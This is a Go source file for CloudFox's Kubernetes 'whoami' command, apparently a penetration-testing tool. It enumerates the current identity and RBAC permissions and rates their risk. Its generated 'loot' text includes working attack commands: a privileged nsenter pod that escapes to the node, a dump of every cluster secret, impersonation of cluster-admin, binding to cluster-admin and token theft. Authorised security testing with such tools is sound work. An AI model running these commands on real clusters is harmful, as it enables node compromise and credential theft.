package commands

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	authenticationv1 "k8s.io/api/authentication/v1"
	authorizationv1 "k8s.io/api/authorization/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
)

var WhoamiCmd = &cobra.Command{
	Use:     "whoami",
	Aliases: []string{},
	Short:   "Display current cluster identity",
	Long: `
Display the identity your kubeconfig or in-cluster credentials are authenticated as:
  cloudfox kubernetes whoami`,
	Run: Whoami,
}

type WhoamiOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (w WhoamiOutput) TableFiles() []internal.TableFile {
	return w.Table
}

func (w WhoamiOutput) LootFiles() []internal.LootFile {
	return w.Loot
}

type WhoamiFinding struct {
	ClusterURL              string
	IdentityFromKubeconfig  string
	IdentityFromSSR         string
	IdentityFromSAAR        string
	ServiceAccountNamespace string
	ServiceAccountName      string
	Groups                  []string
	RiskLevel               string
	DangerousPermissions    []string
	NamespacePermissions    map[string][]string
	ClusterRoleBinding      string
	ClusterRole             string
}

type JWTClaims struct {
	Iss                     string `json:"iss"`
	KubernetesIo            KubeInfo `json:"kubernetes.io"`
	Sub                     string `json:"sub"`
	Exp                     int64  `json:"exp"`
}

type KubeInfo struct {
	Namespace      string            `json:"namespace"`
	ServiceAccount ServiceAccountRef `json:"serviceaccount"`
}

type ServiceAccountRef struct {
	Name string `json:"name"`
	UID  string `json:"uid"`
}

// helper: replaces empty string with "unknown"
func orUnknown(s string) string {
	if s == "" {
		return "unknown"
	}
	return s
}

// TryExtractUserFromKubeconfig attempts to parse kubeconfig and return the user for the current context
func TryExtractUserFromKubeconfig() string {
	logger := internal.NewLogger()

	if globals.KubeConfigPath == "" {
		logger.ErrorM("No kubeconfig path available", globals.K8S_WHOAMI_MODULE_NAME)
		return ""
	}

	// Use clientcmd.LoadFromFile to handle both map and list-style kubeconfigs
	kubeconfig, err := clientcmd.LoadFromFile(globals.KubeConfigPath)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to parse kubeconfig: %v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return ""
	}

	// Determine which context to use
	contextName := globals.KubeContext
	if contextName == "" {
		contextName = kubeconfig.CurrentContext
	}
	if contextName == "" {
		logger.ErrorM("No context specified in kubeconfig", globals.K8S_WHOAMI_MODULE_NAME)
		return ""
	}

	ctx, ok := kubeconfig.Contexts[contextName]
	if !ok {
		logger.ErrorM(fmt.Sprintf("Context %q not found in kubeconfig", contextName), globals.K8S_WHOAMI_MODULE_NAME)
		return ""
	}

	userName := ctx.AuthInfo
	if userName == "" {
		logger.ErrorM(fmt.Sprintf("No user bound to context %q", contextName), globals.K8S_WHOAMI_MODULE_NAME)
		return ""
	}

	if _, ok := kubeconfig.AuthInfos[userName]; ok {
		return userName
	}

	logger.ErrorM(fmt.Sprintf("User %q not found in kubeconfig", userName), globals.K8S_WHOAMI_MODULE_NAME)
	return ""
}

// TrySelfSubjectReview uses the modern SelfSubjectReview API (K8s 1.27+)
// This is the cleanest way to get identity information without noise
func TrySelfSubjectReview(clientset *kubernetes.Clientset) (string, []string, error) {
	ctx := context.Background()

	// Try to create a SelfSubjectReview
	ssr := &authenticationv1.SelfSubjectReview{}
	result, err := clientset.AuthenticationV1().SelfSubjectReviews().Create(ctx, ssr, metav1.CreateOptions{})
	if err != nil {
		return "", nil, err
	}

	username := result.Status.UserInfo.Username
	groups := result.Status.UserInfo.Groups

	return username, groups, nil
}

// DecodeServiceAccountToken attempts to decode a JWT token to extract SA info
func DecodeServiceAccountToken() (string, string, error) {
	// Try to read the in-cluster SA token
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	tokenBytes, err := os.ReadFile(tokenPath)
	if err != nil {
		return "", "", err
	}

	// JWT format: header.payload.signature
	parts := strings.Split(string(tokenBytes), ".")
	if len(parts) != 3 {
		return "", "", fmt.Errorf("invalid JWT format")
	}

	// Decode the payload (second part)
	payload := parts[1]
	// Add padding if needed
	if l := len(payload) % 4; l > 0 {
		payload += strings.Repeat("=", 4-l)
	}

	decoded, err := base64.URLEncoding.DecodeString(payload)
	if err != nil {
		return "", "", err
	}

	var claims JWTClaims
	if err := json.Unmarshal(decoded, &claims); err != nil {
		return "", "", err
	}

	return claims.KubernetesIo.Namespace, claims.KubernetesIo.ServiceAccount.Name, nil
}

// EnumeratePermissions uses SelfSubjectRulesReview to enumerate permissions
func EnumeratePermissions(clientset *kubernetes.Clientset, namespaces []string) (map[string][]string, []string) {
	ctx := context.Background()
	nsPermissions := make(map[string][]string)
	allDangerousPerms := []string{}

	for _, ns := range namespaces {
		ssrr := &authorizationv1.SelfSubjectRulesReview{
			Spec: authorizationv1.SelfSubjectRulesReviewSpec{
				Namespace: ns,
			},
		}

		result, err := clientset.AuthorizationV1().SelfSubjectRulesReviews().Create(ctx, ssrr, metav1.CreateOptions{})
		if err != nil {
			continue
		}

		perms := []string{}
		for _, rule := range result.Status.ResourceRules {
			for _, verb := range rule.Verbs {
				for _, resource := range rule.Resources {
					perm := fmt.Sprintf("%s %s", verb, resource)
					perms = append(perms, perm)

					// Check if dangerous
					if isDangerousPermission(verb, resource, rule.APIGroups) {
						dangerousPerm := fmt.Sprintf("%s %s (namespace: %s)", verb, resource, ns)
						allDangerousPerms = append(allDangerousPerms, dangerousPerm)
					}
				}
			}
		}

		if len(perms) > 0 {
			nsPermissions[ns] = perms
		}
	}

	return nsPermissions, allDangerousPerms
}

// isDangerousPermission checks if a permission is considered dangerous
func isDangerousPermission(verb, resource string, apiGroups []string) bool {
	dangerousPatterns := []struct {
		verb     string
		resource string
	}{
		{"*", "*"},
		{"create", "pods"},
		{"patch", "pods"},
		{"create", "pods/exec"},
		{"create", "pods/attach"},
		{"get", "secrets"},
		{"list", "secrets"},
		{"create", "deployments"},
		{"create", "daemonsets"},
		{"create", "statefulsets"},
		{"create", "jobs"},
		{"create", "cronjobs"},
		{"impersonate", "users"},
		{"impersonate", "groups"},
		{"impersonate", "serviceaccounts"},
		{"escalate", "roles"},
		{"escalate", "clusterroles"},
		{"bind", "roles"},
		{"bind", "clusterroles"},
		{"create", "rolebindings"},
		{"create", "clusterrolebindings"},
		{"create", "tokens"},
		{"create", "serviceaccounts/token"},
		{"delete", "pods"},
		{"update", "configmaps"},
		{"patch", "configmaps"},
	}

	for _, pattern := range dangerousPatterns {
		if (pattern.verb == "*" || pattern.verb == verb) &&
			(pattern.resource == "*" || pattern.resource == resource) {
			return true
		}
	}

	return false
}

// CalculateWhoamiRiskLevel determines the overall risk level
func CalculateWhoamiRiskLevel(clusterRole string, dangerousPerms []string, groups []string) string {
	// CRITICAL: cluster-admin or system:masters group
	if clusterRole == "cluster-admin" {
		return "CRITICAL"
	}
	for _, group := range groups {
		if group == "system:masters" {
			return "CRITICAL"
		}
	}

	// CRITICAL: 5+ dangerous permissions (likely admin)
	if len(dangerousPerms) >= 5 {
		return "CRITICAL"
	}

	// HIGH: impersonate, escalate, or bind permissions
	for _, perm := range dangerousPerms {
		if strings.Contains(perm, "impersonate") ||
			strings.Contains(perm, "escalate") ||
			strings.Contains(perm, "bind clusterroles") {
			return "HIGH"
		}
	}

	// HIGH: 3+ dangerous permissions
	if len(dangerousPerms) >= 3 {
		return "HIGH"
	}

	// MEDIUM: 1-2 dangerous permissions
	if len(dangerousPerms) > 0 {
		return "MEDIUM"
	}

	// LOW: read-only or minimal permissions
	return "LOW"
}

// Extracts the username string from a forbidden error message
func parseUsernameFromError(err error) string {
	if err == nil {
		return ""
	}
	re := regexp.MustCompile(`User\s+"([^"]+)"`)
	match := re.FindStringSubmatch(err.Error())
	if len(match) > 1 {
		return match[1]
	}
	return ""
}

// generateWhoamiLoot creates loot files with exploitation techniques
func generateWhoamiLoot(finding WhoamiFinding, outputDirectory string) []internal.LootFile {
	var lootFiles []internal.LootFile

	// Loot 1: Identity Information
	identityLoot := fmt.Sprintf(`# Whoami - Identity Information

## Cluster Information
- Cluster URL: %s
- Risk Level: %s

## Identity Sources
- Identity from Kubeconfig: %s
- Identity from SelfSubjectReview (SSR): %s
- Identity from SelfSubjectAccessReview (SAAR): %s

## ServiceAccount Information
- Namespace: %s
- Name: %s
- Full SA: %s/%s

## Groups
%s

## RBAC Bindings (from SAAR)
- ClusterRoleBinding: %s
- ClusterRole: %s

## Summary
This identity has been detected with %s risk level.
- Dangerous Permissions: %d
- Namespaces with Permissions: %d
`,
		finding.ClusterURL,
		finding.RiskLevel,
		orUnknown(finding.IdentityFromKubeconfig),
		orUnknown(finding.IdentityFromSSR),
		orUnknown(finding.IdentityFromSAAR),
		orUnknown(finding.ServiceAccountNamespace),
		orUnknown(finding.ServiceAccountName),
		orUnknown(finding.ServiceAccountNamespace),
		orUnknown(finding.ServiceAccountName),
		formatGroups(finding.Groups),
		orUnknown(finding.ClusterRoleBinding),
		orUnknown(finding.ClusterRole),
		finding.RiskLevel,
		len(finding.DangerousPermissions),
		len(finding.NamespacePermissions),
	)

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "Whoami-Identity-Info",
		Contents: identityLoot,
	})

	// Loot 2: Permissions Enumeration
	permissionsLoot := fmt.Sprintf(`# Whoami - Permissions Enumeration

## Overview
Enumerated permissions across %d namespaces using SelfSubjectRulesReview API.

## Namespace Permissions

%s

## Enumeration Commands

### List all your ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | .metadata.name'

### List all your RoleBindings across all namespaces
kubectl get rolebindings -A -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | "\(.metadata.namespace)/\(.metadata.name)"'

### Check if you can list secrets in all namespaces
kubectl auth can-i list secrets --all-namespaces

### Check if you can create pods
kubectl auth can-i create pods

### Check if you can impersonate users
kubectl auth can-i impersonate users

### Enumerate all permissions in a specific namespace
kubectl auth can-i --list -n <namespace>
`,
		len(finding.NamespacePermissions),
		formatNamespacePermissions(finding.NamespacePermissions),
		orUnknown(finding.IdentityFromSSR),
		orUnknown(finding.IdentityFromSSR),
	)

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "Whoami-Permissions",
		Contents: permissionsLoot,
	})

	// Loot 3: Dangerous Permissions
	dangerousLoot := fmt.Sprintf(`# Whoami - Dangerous Permissions

## Summary
Found %d dangerous permissions that could be exploited for privilege escalation or lateral movement.

## Dangerous Permissions Detected
%s

## Exploitation Techniques

### If you have "create pods" permission:
# Create a privileged pod to escape to the node
kubectl run escape-pod --image=alpine --restart=Never --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'

### If you have "create pods/exec" permission:
# Execute commands in existing pods
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

### If you have "get secrets" or "list secrets" permission:
# Extract all secrets
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | to_entries[] | "\(.key)=\(.value | @base64d)")"'

### If you have "impersonate" permission:
# Impersonate cluster-admin
kubectl --as=system:admin get nodes
kubectl --as=cluster-admin get secrets -A

### If you have "escalate" or "bind" permissions:
# Create a ClusterRoleBinding to cluster-admin
kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --serviceaccount=default:default

### If you have "create serviceaccounts/token" permission:
# Create a token for any ServiceAccount
kubectl create token <serviceaccount-name> -n <namespace> --duration=8760h

## Risk Assessment
- Risk Level: %s
- This identity has significant permissions that could compromise cluster security
`,
		len(finding.DangerousPermissions),
		formatDangerousPermissions(finding.DangerousPermissions),
		finding.RiskLevel,
	)

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "Whoami-Dangerous-Permissions",
		Contents: dangerousLoot,
	})

	// Loot 4: Privilege Escalation Paths (if HIGH or CRITICAL risk)
	if finding.RiskLevel == "HIGH" || finding.RiskLevel == "CRITICAL" {
		privescLoot := fmt.Sprintf(`# Whoami - Privilege Escalation Paths

## Risk Level: %s

## Identified Escalation Vectors

%s

## Privilege Escalation Techniques

### Vector 1: ServiceAccount Token Theft
If you have access to pods, steal their ServiceAccount tokens:
# List pods with their ServiceAccounts
kubectl get pods -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.spec.serviceAccountName)"'

# From inside a pod, read the token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use the token with kubectl
kubectl --token="<stolen-token>" get secrets -A

### Vector 2: RBAC Misconfiguration
# Find ClusterRoles with dangerous permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | select(.verbs[]? | contains("*"))) | .metadata.name'

# Find RoleBindings that grant you additional permissions
kubectl get rolebindings,clusterrolebindings -A -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s"))'

### Vector 3: Node Compromise via Privileged Pod
If you can create pods, create a privileged pod to access the node:
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: node-shell
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: shell
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/sh"]
    stdin: true
    tty: true
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

### Vector 4: Secret Extraction
# Extract all secrets in the cluster
kubectl get secrets -A -o json > all-secrets.json

# Look for sensitive secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.metadata.name | contains("token") or contains("password") or contains("key"))'

### Vector 5: Webhook Manipulation
If you have write access to ValidatingWebhookConfiguration or MutatingWebhookConfiguration:
# Create a malicious webhook that allows all requests
# This bypasses admission control
`,
			finding.RiskLevel,
			formatEscalationVectors(finding),
			orUnknown(finding.IdentityFromSSR),
		)

		lootFiles = append(lootFiles, internal.LootFile{
			Name:     "Whoami-Privilege-Escalation",
			Contents: privescLoot,
		})
	}

	// Loot 5: RBAC Enumeration Commands
	rbacEnumLoot := fmt.Sprintf(`# Whoami - RBAC Enumeration

## Current Identity
- Identity: %s
- ServiceAccount: %s/%s
- Groups: %s

## RBAC Enumeration Commands

### 1. Find all ClusterRoles
kubectl get clusterroles

### 2. Find all ClusterRoleBindings
kubectl get clusterrolebindings

### 3. Find ClusterRoleBindings for your identity
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | .metadata.name'

### 4. Find RoleBindings across all namespaces
kubectl get rolebindings -A

### 5. Find RoleBindings for your identity
kubectl get rolebindings -A -o json | jq -r '.items[] | select(.subjects[]? | select(.name=="%s")) | "\(.metadata.namespace)/\(.metadata.name)"'

### 6. Get details of specific ClusterRole
kubectl get clusterrole %s -o yaml

### 7. List all ServiceAccounts
kubectl get serviceaccounts -A

### 8. Check your permissions in each namespace
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl auth can-i --list -n $ns
done

### 9. Check if you can perform dangerous actions
kubectl auth can-i create pods
kubectl auth can-i create pods/exec
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i impersonate users
kubectl auth can-i impersonate serviceaccounts
kubectl auth can-i escalate
kubectl auth can-i bind

### 10. Find all identities with cluster-admin
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]? | "\(.kind)/\(.name)"'

### 11. Find overly permissive RBAC rules
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | select(.verbs[]? == "*" or .resources[]? == "*"))'

### 12. Audit ServiceAccount tokens
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name)"'

## Advanced Enumeration

### Using kubectl-who-can (requires plugin)
# Install: kubectl krew install who-can
kubectl who-can create pods
kubectl who-can get secrets --all-namespaces
kubectl who-can '*' '*'

### Using rbac-lookup (requires tool)
# Install: https://github.com/FairwindsOps/rbac-lookup
rbac-lookup %s

### Extracting full RBAC policy
kubectl get clusterroles,roles,clusterrolebindings,rolebindings -A -o yaml > rbac-full-dump.yaml
`,
		orUnknown(finding.IdentityFromSSR),
		orUnknown(finding.ServiceAccountNamespace),
		orUnknown(finding.ServiceAccountName),
		formatGroups(finding.Groups),
		orUnknown(finding.IdentityFromSSR),
		orUnknown(finding.IdentityFromSSR),
		orUnknown(finding.ClusterRole),
		orUnknown(finding.IdentityFromSSR),
	)

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "Whoami-RBAC-Enum",
		Contents: rbacEnumLoot,
	})

	return lootFiles
}

// Helper functions for loot generation

func formatGroups(groups []string) string {
	if len(groups) == 0 {
		return "- None"
	}
	var result string
	for _, group := range groups {
		result += fmt.Sprintf("- %s\n", group)
	}
	return result
}

func formatNamespacePermissions(nsPerms map[string][]string) string {
	if len(nsPerms) == 0 {
		return "No permissions enumerated (may lack list permissions)"
	}

	// Sort namespaces for consistent output
	namespaces := make([]string, 0, len(nsPerms))
	for ns := range nsPerms {
		namespaces = append(namespaces, ns)
	}
	sort.Strings(namespaces)

	var result string
	for _, ns := range namespaces {
		perms := nsPerms[ns]
		result += fmt.Sprintf("### Namespace: %s\n", ns)
		result += fmt.Sprintf("Permissions: %d\n", len(perms))

		// Show first 10 permissions, then count
		displayCount := 10
		if len(perms) < displayCount {
			displayCount = len(perms)
		}
		for i := 0; i < displayCount; i++ {
			result += fmt.Sprintf("  - %s\n", perms[i])
		}
		if len(perms) > displayCount {
			result += fmt.Sprintf("  ... and %d more\n", len(perms)-displayCount)
		}
		result += "\n"
	}
	return result
}

func formatDangerousPermissions(dangerousPerms []string) string {
	if len(dangerousPerms) == 0 {
		return "No dangerous permissions detected."
	}

	var result string
	for i, perm := range dangerousPerms {
		result += fmt.Sprintf("%d. %s\n", i+1, perm)
	}
	return result
}

func formatEscalationVectors(finding WhoamiFinding) string {
	var vectors []string

	// Check for specific escalation vectors
	for _, perm := range finding.DangerousPermissions {
		if strings.Contains(perm, "impersonate") {
			vectors = append(vectors, "- **Impersonation**: You can impersonate other users/serviceaccounts to gain their permissions")
		}
		if strings.Contains(perm, "escalate") || strings.Contains(perm, "bind") {
			vectors = append(vectors, "- **RBAC Escalation**: You can create/modify role bindings to grant yourself cluster-admin")
		}
		if strings.Contains(perm, "create pods") {
			vectors = append(vectors, "- **Pod Creation**: You can create privileged pods to escape to the node")
		}
		if strings.Contains(perm, "get secrets") || strings.Contains(perm, "list secrets") {
			vectors = append(vectors, "- **Secret Access**: You can read secrets containing credentials and tokens")
		}
		if strings.Contains(perm, "create pods/exec") {
			vectors = append(vectors, "- **Command Execution**: You can execute commands in existing pods")
		}
	}

	// Check for cluster-admin
	if finding.ClusterRole == "cluster-admin" {
		vectors = append([]string{"- **CRITICAL: cluster-admin Role**: Full cluster administrative access"}, vectors...)
	}

	// Check for system:masters group
	for _, group := range finding.Groups {
		if group == "system:masters" {
			vectors = append([]string{"- **CRITICAL: system:masters Group**: Unrestricted cluster access"}, vectors...)
			break
		}
	}

	if len(vectors) == 0 {
		return "No specific escalation vectors identified, but the risk level suggests potential paths exist."
	}

	// Remove duplicates
	seen := make(map[string]bool)
	unique := []string{}
	for _, v := range vectors {
		if !seen[v] {
			seen[v] = true
			unique = append(unique, v)
		}
	}

	return strings.Join(unique, "\n")
}

func Whoami(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()

	// Set output params leveraging parent (k8s) pflag values
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Identifying current cluster identity for %s", globals.ClusterName), globals.K8S_WHOAMI_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Initialize finding
	finding := WhoamiFinding{
		NamespacePermissions: make(map[string][]string),
	}

	// Get cluster URL
	finding.ClusterURL = clientset.RESTClient().Get().URL().String()

	// Method 1: Try kubeconfig extraction
	finding.IdentityFromKubeconfig = TryExtractUserFromKubeconfig()

	// Method 2: Try modern SelfSubjectReview API (K8s 1.27+)
	ssrUsername, groups, err := TrySelfSubjectReview(clientset)
	if err == nil {
		finding.IdentityFromSSR = ssrUsername
		finding.Groups = groups
	} else {
		logger.ErrorM(fmt.Sprintf("SelfSubjectReview not available (may require K8s 1.27+): %v", err), globals.K8S_WHOAMI_MODULE_NAME)
	}

	// Method 3: Try ServiceAccount token decoding (for in-cluster)
	saNamespace, saName, err := DecodeServiceAccountToken()
	if err == nil {
		finding.ServiceAccountNamespace = saNamespace
		finding.ServiceAccountName = saName
	}

	// Method 4: Use SelfSubjectAccessReview to get role binding info
	ssar := &authorizationv1.SelfSubjectAccessReview{
		Spec: authorizationv1.SelfSubjectAccessReviewSpec{
			ResourceAttributes: &authorizationv1.ResourceAttributes{
				Verb:     "get",
				Resource: "pods",
			},
		},
	}

	ssarResult, err := clientset.AuthorizationV1().SelfSubjectAccessReviews().Create(ctx, ssar, metav1.CreateOptions{})
	if err == nil {
		reason := ssarResult.Status.Reason

		// Parse reason for additional info
		reClusterRoleBinding := regexp.MustCompile(`ClusterRoleBinding "([^"]+)"`)
		reClusterRole := regexp.MustCompile(`ClusterRole "([^"]+)"`)
		reUser := regexp.MustCompile(`User "([^"]+)"`)

		if match := reClusterRoleBinding.FindStringSubmatch(reason); len(match) > 1 {
			finding.ClusterRoleBinding = match[1]
		}
		if match := reClusterRole.FindStringSubmatch(reason); len(match) > 1 {
			finding.ClusterRole = match[1]
		}
		if match := reUser.FindStringSubmatch(reason); len(match) > 1 {
			finding.IdentityFromSAAR = match[1]
		}
	}

	// Get list of namespaces to enumerate permissions
	nsList, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	namespaces := []string{}
	if err == nil {
		for _, ns := range nsList.Items {
			namespaces = append(namespaces, ns.Name)
		}
	} else {
		// If we can't list namespaces, try common ones
		namespaces = []string{"default", "kube-system", "kube-public", "kube-node-lease"}
	}

	// Enumerate permissions using SelfSubjectRulesReview
	logger.InfoM(fmt.Sprintf("Enumerating permissions across %d namespaces", len(namespaces)), globals.K8S_WHOAMI_MODULE_NAME)
	nsPerms, dangerousPerms := EnumeratePermissions(clientset, namespaces)
	finding.NamespacePermissions = nsPerms
	finding.DangerousPermissions = dangerousPerms

	// Calculate risk level
	finding.RiskLevel = CalculateWhoamiRiskLevel(finding.ClusterRole, finding.DangerousPermissions, finding.Groups)

	// Log risk summary
	logger.InfoM(fmt.Sprintf("Risk Level: %s | Dangerous Permissions: %d | Namespaces with Permissions: %d",
		finding.RiskLevel, len(finding.DangerousPermissions), len(finding.NamespacePermissions)),
		globals.K8S_WHOAMI_MODULE_NAME)

	// Build table
	headers := []string{"Cluster URL", "Identity (Kubeconfig)", "Identity (SSR)", "Identity (SSAR)", "ServiceAccount", "Groups", "Risk Level", "Dangerous Permissions", "ClusterRole"}

	identitySSR := orUnknown(finding.IdentityFromSSR)
	identityKubeconfig := orUnknown(finding.IdentityFromKubeconfig)
	identitySAAR := orUnknown(finding.IdentityFromSAAR)

	saInfo := "N/A"
	if finding.ServiceAccountNamespace != "" && finding.ServiceAccountName != "" {
		saInfo = fmt.Sprintf("%s/%s", finding.ServiceAccountNamespace, finding.ServiceAccountName)
	}

	groupsStr := "N/A"
	if len(finding.Groups) > 0 {
		groupsStr = strings.Join(finding.Groups, ", ")
	}

	dangerousPermsStr := fmt.Sprintf("%d found", len(finding.DangerousPermissions))
	clusterRole := orUnknown(finding.ClusterRole)

	rows := [][]string{{
		finding.ClusterURL,
		identityKubeconfig,
		identitySSR,
		identitySAAR,
		saInfo,
		groupsStr,
		finding.RiskLevel,
		dangerousPermsStr,
		clusterRole,
	}}

	table := internal.TableFile{
		Name:   "Whoami",
		Header: headers,
		Body:   rows,
	}

	// Generate loot files
	lootFiles := generateWhoamiLoot(finding, outputDirectory)

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Whoami",
		globals.ClusterName,
		"results",
		WhoamiOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_WHOAMI_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Identity enumeration complete: %s risk", finding.RiskLevel), globals.K8S_WHOAMI_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_WHOAMI_MODULE_NAME), globals.K8S_WHOAMI_MODULE_NAME)
}
